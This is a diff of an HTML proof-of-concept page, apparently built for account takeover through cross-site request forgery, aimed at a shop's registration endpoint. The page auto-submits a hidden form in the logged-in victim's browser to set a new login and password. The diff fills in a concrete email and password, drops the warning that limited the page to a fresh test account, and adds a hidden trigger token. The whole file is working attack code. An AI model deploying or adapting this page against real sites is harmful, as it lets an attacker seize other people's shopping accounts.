@@ -3,25 +3,22 @@
 <head><meta charset="utf-8"><title>Loading…</title></head>
 <body>
 <p id="msg">Submitting…</p>
+<p id="set" style="font-family:monospace;font-size:16px"></p>
 
-<!-- Edit the two markers below before opening this page:
-     __YOUR_ACCOUNT_EMAIL__   = lobo@lobo.com
-     __YOUR_NEW_PASSWORD__    = Attacker@123
-     Use ONLY a fresh test account. The account logged into this browser is the one changed. -->
 <form id="f" method="POST" target="sink" action="https://www.sparkshop.com/register.ajx?mt=1" enctype="application/x-www-form-urlencoded">
   <input type="hidden" name="mode" value="register">
   <input type="hidden" name="anchorName" value="">
   <input type="hidden" name="doSubmit" value="">
   <input type="hidden" name="register" value="$authenticationSubmitURL">
-  <input type="hidden" name="customerDTO.firstName" value="Regprobe">
-  <input type="hidden" name="customerDTO.lastName" value="Regprobe">
+  <input type="hidden" name="customerDTO.firstName" value="Attacker">
+  <input type="hidden" name="customerDTO.lastName" value="Two">
   <input type="hidden" name="customerDTO.customerAddresses['1'].phone" value="5551234567">
   <input type="hidden" name="customerDTO.customerAddresses['1'].company" value="">
   <input type="hidden" name="customerDTO.middleName" value="">
-  <input type="hidden" name="customerDTO.loginname" value="attacker@lobo.com">
-  <input type="hidden" name="confirmLogin" value="Attacker@123">
-  <input type="hidden" name="customerDTO.loginpassword" value="__YOUR_NEW_PASSWORD__">
-  <input type="hidden" name="confirmPassword" value="__YOUR_NEW_PASSWORD__">
+  <input type="hidden" name="customerDTO.loginname" value="kaxari7158@goldlicai.com">
+  <input type="hidden" name="confirmLogin" value="kaxari7158@goldlicai.com">
+  <input type="hidden" name="customerDTO.loginpassword" value="Zq7!mR2vXn8#K">
+  <input type="hidden" name="confirmPassword" value="Zq7!mR2vXn8#K">
   <input type="hidden" name="customerDTO.externalLoginDTO.firstName" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.lastName" value="">
   <input type="hidden" name="customerDTO.externalLoginDTO.email" value="">
@@ -40,15 +37,17 @@
 (function () {
   var email = document.querySelector('[name="customerDTO.loginname"]').value;
   var pass = document.querySelector('[name="customerDTO.loginpassword"]').value;
-  if (email.indexOf('__YOUR_') === 0 || pass.indexOf('__YOUR_') === 0) {
-    document.getElementById('msg').textContent =
-      'Hello L0bo landed here For accout takeover l0b0.';
+  document.getElementById('set').textContent =
+    'Account: ' + email + '  |  new password: ' + pass;
+  // Only run when opened with the test token, so a random visitor never fires it.
+  if (new URLSearchParams(location.search).get('run') !== 'r7k2x9') {
+    document.getElementById('msg').textContent = 'Nothing to see here.';
     return;
   }
   document.getElementById('f').submit();
   setTimeout(function () {
     document.getElementById('msg').textContent =
-      'Done. Open an Incognito window and try the old password (should fail) and the new password (should work).';
+      'Done. The password for ' + email + ' is now: ' + pass;
   }, 3500);
 })();
 </script>
